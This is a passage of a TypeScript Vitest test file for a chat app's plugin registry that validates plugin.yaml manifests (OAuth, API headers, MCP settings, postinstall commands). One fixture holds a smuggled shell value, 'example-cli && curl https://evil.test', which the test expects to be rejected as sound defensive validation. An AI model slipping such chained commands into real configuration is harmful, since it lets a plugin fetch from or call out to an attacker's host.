import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";

const originalCwd = process.cwd();

async function setPackages(packageNames: string[]): Promise<void> {
  const { setPluginPackages } =
    await import("@/chat/plugins/package-discovery");
  setPluginPackages(packageNames);
}

async function expectRegistryLoadFailure(
  packageNames: string[],
  message: string,
): Promise<void> {
  await setPackages(packageNames);
  const registry = await import("@/chat/plugins/registry");
  expect(() => registry.getPluginProviders()).toThrow(message);
}

async function writePackagedPlugin(tempRoot: string): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-demo",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "capabilities:",
      "  - api",
      "config-keys:",
      "  - org",
      "credentials:",
      "  type: oauth-bearer",
      "  api-domains:",
      "    - api.example.com",
      "  auth-token-env: DEMO_AUTH_TOKEN",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithImplicitLatest(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-implicit-version",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "capabilities:",
      "  - api",
      "config-keys:",
      "  - org",
      "credentials:",
      "  type: oauth-bearer",
      "  api-domains:",
      "    - api.example.com",
      "  auth-token-env: DEMO_AUTH_TOKEN",
      "runtime-dependencies:",
      "  - type: npm",
      "    package: sentry",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithSystemUrlDependency(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-system-url",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "runtime-dependencies:",
      "  - type: system",
      "    url: https://example.com/tool.rpm",
      "    sha256: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithRuntimePostinstall(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-postinstall",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "runtime-dependencies:",
      "  - type: npm",
      "    package: example-cli",
      "runtime-postinstall:",
      "  - cmd: example-cli",
      "    args: [install]",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithInvalidApiDomain(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-invalid-domain",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "capabilities:",
      "  - api",
      "config-keys:",
      "  - org",
      "credentials:",
      "  type: oauth-bearer",
      "  api-domains:",
      "    - '*'",
      "  auth-token-env: DEMO_AUTH_TOKEN",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithInvalidAuthTokenEnv(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-invalid-auth-env",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "capabilities:",
      "  - api",
      "config-keys:",
      "  - org",
      "credentials:",
      "  type: oauth-bearer",
      "  api-domains:",
      "    - api.example.com",
      "  auth-token-env: demo_token",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithInvalidRuntimePostinstallCmd(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-invalid-postinstall",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "runtime-postinstall:",
      '  - cmd: "example-cli && curl https://evil.test"',
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithInvalidOauthEndpoint(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-invalid-oauth",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "capabilities:",
      "  - api",
      "credentials:",
      "  type: oauth-bearer",
      "  api-domains:",
      "    - api.example.com",
      "  auth-token-env: DEMO_AUTH_TOKEN",
      "oauth:",
      "  client-id-env: DEMO_CLIENT_ID",
      "  client-secret-env: DEMO_CLIENT_SECRET",
      "  authorize-endpoint: http://example.com/oauth/authorize",
      "  token-endpoint: https://example.com/oauth/token",
      "  scope: event:read",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithOauthOverrides(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-oauth-overrides",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: example",
      "description: Example plugin",
      "capabilities:",
      "  - api.read",
      "credentials:",
      "  type: oauth-bearer",
      "  api-domains:",
      "    - api.example.com",
      "  api-headers:",
      '    X-Api-Version: "2026-01-01"',
      "  auth-token-env: EXAMPLE_TOKEN",
      "oauth:",
      "  client-id-env: EXAMPLE_CLIENT_ID",
      "  client-secret-env: EXAMPLE_CLIENT_SECRET",
      "  authorize-endpoint: https://api.example.com/v1/oauth/authorize",
      "  token-endpoint: https://api.example.com/v1/oauth/token",
      "  scope: api.read",
      "  authorize-params:",
      "    audience: workspace",
      "  token-auth-method: basic",
      "  token-extra-headers:",
      "    Content-Type: application/json",
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithForbiddenApiHeader(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-bad-api-headers",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo plugin",
      "capabilities:",
      "  - api",
      "credentials:",
      "  type: oauth-bearer",
      "  api-domains:",
      "    - api.example.com",
      "  api-headers:",
      "    Authorization: Bearer nope",
      "  auth-token-env: DEMO_AUTH_TOKEN",
    ].join("\n"),
    "utf8",
  );
}

interface WritePackagedPluginWithMcpOptions {
  packageName?: string;
  description?: string;
  url?: string;
  headers?: Record<string, string>;
  allowedTools?: string[];
  envVars?: Record<string, { default?: string } | null>;
}

async function writePackagedPluginWithMcp(
  tempRoot: string,
  options: WritePackagedPluginWithMcpOptions = {},
): Promise<void> {
  const packageName = options.packageName ?? "junior-plugin-mcp";
  const packageRoot = path.join(tempRoot, "node_modules", "@acme", packageName);
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });

  const lines: string[] = [
    "name: demo",
    `description: ${options.description ?? "Demo MCP plugin"}`,
  ];

  if (options.envVars) {
    lines.push("env-vars:");
    for (const [name, decl] of Object.entries(options.envVars)) {
      lines.push(`  ${name}:`);
      if (decl && decl.default !== undefined) {
        lines.push(`    default: ${decl.default}`);
      }
    }
  }

  lines.push("mcp:");
  lines.push(`  url: ${options.url ?? "https://mcp.example.com"}`);
  if (options.headers) {
    lines.push("  headers:");
    for (const [key, value] of Object.entries(options.headers)) {
      lines.push(`    ${key}: "${value}"`);
    }
  }
  if (options.allowedTools) {
    lines.push("  allowed-tools:");
    for (const tool of options.allowedTools) {
      lines.push(`    - ${tool}`);
    }
  }

  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    lines.join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithInvalidMcpAllowedTools(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-mcp-invalid-allowed-tools",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo MCP plugin",
      "mcp:",
      "  transport: http",
      "  url: https://mcp.example.com",
      '  allowed-tools: "search"',
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithForbiddenMcpHeader(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-mcp-forbidden-header",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo MCP plugin",
      "mcp:",
      "  transport: http",
      "  url: https://mcp.example.com",
      "  headers:",
      '    Authorization: "Bearer nope"',
    ].join("\n"),
    "utf8",
  );
}

async function writePackagedPluginWithInvalidMcpTransport(
  tempRoot: string,
): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-mcp-invalid-transport",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    [
      "name: demo",
      "description: Demo MCP plugin",
      "mcp:",
      "  transport: stdio",
      "  url: https://mcp.example.com",
    ].join("\n"),
    "utf8",
  );
}

async function writeBundlingOnlyPlugin(tempRoot: string): Promise<void> {
  const packageRoot = path.join(
    tempRoot,
    "node_modules",
    "@acme",
    "junior-plugin-bundle-only",
  );
  const skillsDir = path.join(packageRoot, "skills", "demo");
  await fs.mkdir(skillsDir, { recursive: true });
  await fs.writeFile(
    path.join(packageRoot, "plugin.yaml"),
    ["name: demo", "description: Demo bundle-only plugin"].join("\n"),
    "utf8",
  );
}

afterEach(() => {
  process.chdir(originalCwd);
  vi.resetModules();
  vi.doUnmock("@/chat/discovery");
});

describe("plugin registry package discovery", () => {
  it("loads plugins from installed npm dependencies", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPlugin(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-demo": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await setPackages(["@acme/junior-plugin-demo"]);
    const registry = await import("@/chat/plugins/registry");
    const providers = registry.getPluginProviders();
    expect(providers).toHaveLength(1);
    expect(providers[0]?.manifest.name).toBe("demo");
    expect(providers[0]?.manifest.capabilities).toEqual(["demo.api"]);
    const resolvedTempRoot = await fs.realpath(tempRoot);
    expect(registry.getPluginSkillRoots()).toEqual([
      path.join(
        resolvedTempRoot,
        "node_modules",
        "@acme",
        "junior-plugin-demo",
        "skills",
      ),
    ]);
    expect(registry.isPluginProvider("demo")).toBe(true);
  });

  it("defaults npm runtime dependency version to latest when omitted", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithImplicitLatest(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-implicit-version": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await setPackages(["@acme/junior-plugin-implicit-version"]);
    const registry = await import("@/chat/plugins/registry");
    const providers = registry.getPluginProviders();
    expect(providers).toHaveLength(1);
    expect(providers[0]?.manifest.runtimeDependencies).toEqual([
      { type: "npm", package: "sentry", version: "latest" },
    ]);
  });

  it("loads bundle-only plugins without capability or credential fields", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writeBundlingOnlyPlugin(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-bundle-only": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await setPackages(["@acme/junior-plugin-bundle-only"]);
    const registry = await import("@/chat/plugins/registry");
    const providers = registry.getPluginProviders();
    expect(providers).toHaveLength(1);
    expect(providers[0]?.manifest.name).toBe("demo");
    expect(providers[0]?.manifest.capabilities).toEqual([]);
    expect(providers[0]?.manifest.configKeys).toEqual([]);
    expect(providers[0]?.manifest.credentials).toBeUndefined();
    expect(() =>
      registry.createPluginBroker("demo", {
        userTokenStore: {
          get: async () => undefined,
          set: async () => {},
          delete: async () => {},
        },
      }),
    ).toThrow('Provider "demo" has no credentials configured');
  });

  it("parses system URL runtime dependencies with required sha256", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithSystemUrlDependency(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-system-url": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await setPackages(["@acme/junior-plugin-system-url"]);
    const registry = await import("@/chat/plugins/registry");
    const providers = registry.getPluginProviders();
    expect(providers).toHaveLength(1);
    expect(providers[0]?.manifest.runtimeDependencies).toEqual([
      {
        type: "system",
        url: "https://example.com/tool.rpm",
        sha256:
          "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      },
    ]);
  });

  it("parses runtime-postinstall commands", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithRuntimePostinstall(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-postinstall": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await setPackages(["@acme/junior-plugin-postinstall"]);
    const registry = await import("@/chat/plugins/registry");
    const providers = registry.getPluginProviders();
    expect(providers).toHaveLength(1);
    expect(providers[0]?.manifest.runtimePostinstall).toEqual([
      {
        cmd: "example-cli",
        args: ["install"],
      },
    ]);
  });

  it("rejects credentials with invalid api-domains values", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithInvalidApiDomain(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-invalid-domain": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-invalid-domain"],
      "credentials.api-domains entries must be valid domain names",
    );
  });

  it("rejects credentials with invalid auth-token-env values", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithInvalidAuthTokenEnv(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-invalid-auth-env": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-invalid-auth-env"],
      "auth-token-env must be an uppercase env var name",
    );
  });

  it("rejects runtime-postinstall commands that are not single executable tokens", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithInvalidRuntimePostinstallCmd(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-invalid-postinstall": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-invalid-postinstall"],
      "runtime-postinstall cmd must be a single executable token",
    );
  });

  it("rejects oauth endpoints that are not https URLs", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithInvalidOauthEndpoint(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-invalid-oauth": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-invalid-oauth"],
      "oauth.authorize-endpoint must use https",
    );
  });

  it("parses optional oauth overrides and api headers from packaged plugins", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithOauthOverrides(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-oauth-overrides": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await setPackages(["@acme/junior-plugin-oauth-overrides"]);
    const registry = await import("@/chat/plugins/registry");
    const provider = registry.getPluginProviders()[0];
    expect(provider?.manifest.credentials).toMatchObject({
      type: "oauth-bearer",
      apiHeaders: {
        "X-Api-Version": "2026-01-01",
      },
    });
    expect(provider?.manifest.oauth).toMatchObject({
      authorizeParams: {
        audience: "workspace",
      },
      tokenAuthMethod: "basic",
      tokenExtraHeaders: {
        "Content-Type": "application/json",
      },
    });
    expect(registry.getPluginOAuthConfig("example")).toMatchObject({
      authorizeParams: {
        audience: "workspace",
      },
      tokenAuthMethod: "basic",
      tokenExtraHeaders: {
        "Content-Type": "application/json",
      },
    });
  });

  it("rejects Authorization in plugin api headers", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithForbiddenApiHeader(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-bad-api-headers": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-bad-api-headers"],
      "Plugin demo credentials.api-headers.Authorization is not allowed",
    );
  });

  it("infers HTTP MCP configuration from packaged plugins with a URL", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithMcp(tempRoot, {
      headers: { "X-Workspace": "acme" },
      allowedTools: ["search", "fetch"],
    });
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-mcp": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await setPackages(["@acme/junior-plugin-mcp"]);
    const registry = await import("@/chat/plugins/registry");
    const provider = registry.getPluginProviders()[0];
    expect(provider?.manifest.mcp).toEqual({
      transport: "http",
      url: "https://mcp.example.com",
      headers: {
        "X-Workspace": "acme",
      },
      allowedTools: ["search", "fetch"],
    });
    expect(
      registry.getPluginMcpProviders().map((plugin) => plugin.manifest.name),
    ).toEqual(["demo"]);
  });

  it("rejects invalid MCP allowed-tools declarations", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithInvalidMcpAllowedTools(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-mcp-invalid-allowed-tools": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-mcp-invalid-allowed-tools"],
      "Plugin demo mcp.allowed-tools must be an array of strings when provided",
    );
  });

  it("rejects Authorization in plugin MCP headers", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithForbiddenMcpHeader(tempRoot);
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-mcp-forbidden-header": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-mcp-forbidden-header"],
      "Plugin demo mcp.headers.Authorization is not allowed",
    );
  });

  it("resolves ${VAR} to env-vars default when process.env is unset", async () => {
    const previous = process.env.JUNIOR_TEST_MCP_HOST;
    delete process.env.JUNIOR_TEST_MCP_HOST;
    try {
      const tempRoot = await fs.mkdtemp(
        path.join(os.tmpdir(), "junior-plugin-package-"),
      );
      await writePackagedPluginWithMcp(tempRoot, {
        packageName: "junior-plugin-mcp-template",
        url: "https://mcp.${JUNIOR_TEST_MCP_HOST}/api/unstable/mcp-server/mcp?toolsets=core",
        envVars: { JUNIOR_TEST_MCP_HOST: { default: "example.com" } },
      });
      await fs.writeFile(
        path.join(tempRoot, "package.json"),
        JSON.stringify({
          name: "temp-junior-app",
          private: true,
          dependencies: {
            "@acme/junior-plugin-mcp-template": "1.0.0",
          },
        }),
        "utf8",
      );
      process.chdir(tempRoot);

      vi.resetModules();
      vi.doMock("@/chat/discovery", async (importOriginal) => ({
        ...(await importOriginal<typeof import("@/chat/discovery")>()),
        pluginRoots: () => [],
      }));

      await setPackages(["@acme/junior-plugin-mcp-template"]);
      const registry = await import("@/chat/plugins/registry");
      const provider = registry.getPluginProviders()[0];
      expect(provider?.manifest.mcp?.url).toBe(
        "https://mcp.example.com/api/unstable/mcp-server/mcp?toolsets=core",
      );
      expect(provider?.manifest.envVars).toEqual({
        JUNIOR_TEST_MCP_HOST: { default: "example.com" },
      });
    } finally {
      if (previous === undefined) {
        delete process.env.JUNIOR_TEST_MCP_HOST;
      } else {
        process.env.JUNIOR_TEST_MCP_HOST = previous;
      }
    }
  });

  it("prefers process.env over the env-vars default when both are present", async () => {
    const previous = process.env.JUNIOR_TEST_MCP_HOST;
    process.env.JUNIOR_TEST_MCP_HOST = "us5.example.com";
    try {
      const tempRoot = await fs.mkdtemp(
        path.join(os.tmpdir(), "junior-plugin-package-"),
      );
      await writePackagedPluginWithMcp(tempRoot, {
        packageName: "junior-plugin-mcp-template",
        url: "https://mcp.${JUNIOR_TEST_MCP_HOST}/api/unstable/mcp-server/mcp?toolsets=core",
        envVars: { JUNIOR_TEST_MCP_HOST: { default: "example.com" } },
      });
      await fs.writeFile(
        path.join(tempRoot, "package.json"),
        JSON.stringify({
          name: "temp-junior-app",
          private: true,
          dependencies: {
            "@acme/junior-plugin-mcp-template": "1.0.0",
          },
        }),
        "utf8",
      );
      process.chdir(tempRoot);

      vi.resetModules();
      vi.doMock("@/chat/discovery", async (importOriginal) => ({
        ...(await importOriginal<typeof import("@/chat/discovery")>()),
        pluginRoots: () => [],
      }));

      await setPackages(["@acme/junior-plugin-mcp-template"]);
      const registry = await import("@/chat/plugins/registry");
      const provider = registry.getPluginProviders()[0];
      expect(provider?.manifest.mcp?.url).toBe(
        "https://mcp.us5.example.com/api/unstable/mcp-server/mcp?toolsets=core",
      );
    } finally {
      if (previous === undefined) {
        delete process.env.JUNIOR_TEST_MCP_HOST;
      } else {
        process.env.JUNIOR_TEST_MCP_HOST = previous;
      }
    }
  });

  it("fails to load when ${VAR} is declared without a default and process.env is unset", async () => {
    const previous = process.env.JUNIOR_TEST_MCP_HOST;
    delete process.env.JUNIOR_TEST_MCP_HOST;
    try {
      const tempRoot = await fs.mkdtemp(
        path.join(os.tmpdir(), "junior-plugin-package-"),
      );
      await writePackagedPluginWithMcp(tempRoot, {
        packageName: "junior-plugin-mcp-template",
        url: "https://mcp.${JUNIOR_TEST_MCP_HOST}/api/unstable/mcp-server/mcp",
        envVars: { JUNIOR_TEST_MCP_HOST: null },
      });
      await fs.writeFile(
        path.join(tempRoot, "package.json"),
        JSON.stringify({
          name: "temp-junior-app",
          private: true,
          dependencies: {
            "@acme/junior-plugin-mcp-template": "1.0.0",
          },
        }),
        "utf8",
      );
      process.chdir(tempRoot);

      vi.resetModules();
      vi.doMock("@/chat/discovery", async (importOriginal) => ({
        ...(await importOriginal<typeof import("@/chat/discovery")>()),
        pluginRoots: () => [],
      }));

      await expectRegistryLoadFailure(
        ["@acme/junior-plugin-mcp-template"],
        "Plugin demo mcp.url env var JUNIOR_TEST_MCP_HOST is unset and has no default in env-vars",
      );
    } finally {
      if (previous === undefined) {
        delete process.env.JUNIOR_TEST_MCP_HOST;
      } else {
        process.env.JUNIOR_TEST_MCP_HOST = previous;
      }
    }
  });

  it("fails to load when mcp.url references an env var that is not declared in env-vars", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithMcp(tempRoot, {
      packageName: "junior-plugin-mcp-template",
      url: "https://mcp.${JUNIOR_TEST_UNDECLARED_HOST}/api/unstable/mcp-server/mcp",
    });
    await fs.writeFile(
      path.join(tempRoot, "package.json"),
      JSON.stringify({
        name: "temp-junior-app",
        private: true,
        dependencies: {
          "@acme/junior-plugin-mcp-template": "1.0.0",
        },
      }),
      "utf8",
    );
    process.chdir(tempRoot);

    vi.resetModules();
    vi.doMock("@/chat/discovery", async (importOriginal) => ({
      ...(await importOriginal<typeof import("@/chat/discovery")>()),
      pluginRoots: () => [],
    }));

    await expectRegistryLoadFailure(
      ["@acme/junior-plugin-mcp-template"],
      "Plugin demo mcp.url references env var JUNIOR_TEST_UNDECLARED_HOST which is not declared in env-vars",
    );
  });

  it("rejects env-vars keys that do not match [A-Z_][A-Z0-9_]*", async () => {
    const tempRoot = await fs.mkdtemp(
      path.join(os.tmpdir(), "junior-plugin-package-"),
    );
    await writePackagedPluginWithMcp(tempRoot, {
      packageName: "junior-plugin-mcp-bad-env",
      url: "https://mcp.example.com/api",
      envVars: { "lowercase-name": { default: "x" } },
    });
